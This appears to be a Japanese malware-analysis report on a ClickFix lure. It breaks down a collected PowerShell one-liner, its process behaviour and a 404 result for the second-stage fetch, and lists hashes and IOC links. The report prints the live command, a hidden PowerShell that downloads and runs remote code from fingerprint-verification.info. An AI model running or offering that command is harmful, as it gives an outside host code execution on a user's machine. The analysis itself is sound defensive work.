# ClickFix command解析: pt1

## 概要

`clickfix-command.txt`で収集済みのpt1を、実行せずに文字列・process・後段取得境界へ分解した結果です。
ClickFixはmalware familyではなく、利用者にcommandを貼り付けさせる初期アクセス手法として扱います。

- case ID: `20260825-command-pt1`
- stage domain: `fingerprint-verification.info`
- command SHA-256: `ad205fd0791c387ae175527f61eeafd7f56ef6458cfbfa14cb790135136d52f5`
- source file SHA-256: `8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0`
- 重複数: `1`
- command実行: `false`
- payload実行: `false`

## 実command line

```powershell
powershell -w h "iex(irm 'fingerprint-verification.info/b65e021a394660c5'); Start-Sleep -Seconds 24"; exit;
```

## 復号結果

```text
該当なし（原文のまま解釈）
```

## 悪性process挙動

```text
利用者起点（Run dialogまたは既存shell） → powershell.exe → 同一powershell.exe内でHTTP応答をIEX評価
```

-w hはWindowStyle Hiddenを指定し、PowerShell画面を隠す。
- irmで取得した応答をiexへ直接渡し、ディスク保存なしで同一process内に評価する。
- 評価が戻った後に24秒待機し、末尾のexitで呼出し元shell終了を試みる。
- 取得文字列はschemeを省略しているため、実行環境のURI解釈によっては取得前に失敗し得る。

## 最終取得状態

- analyst probe: `https://fingerprint-verification.info/b65e021a394660c5`
- 結果: `HTTP 404、146 bytes、body SHA-256 55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0`
- 後段script／payload復元: `false`

現在の限定GETでは実行可能な後段本文を復元できませんでした。したがって、確実に言える最終ローカル動作は「HTTP応答をPowerShellとしてメモリ内評価する」境界までです。後段が生成する追加process、永続化、最終malware familyは未確認であり、推測で補っていません。

schemeを省略したraw locatorは原文どおり記録し、analyst probeだけ`https://`へ正規化しています。probe結果を実行時証跡とは扱いません。

## 関連成果物

- [processとcommand詳細](OVERALL-LOGIC.md)
- [感染チェーン](INFECTION-CHAIN.md)
- [特徴](FEATURES.md)
- [IOC](IOC-LIST.md)
- [構造化解析](analysis.json)
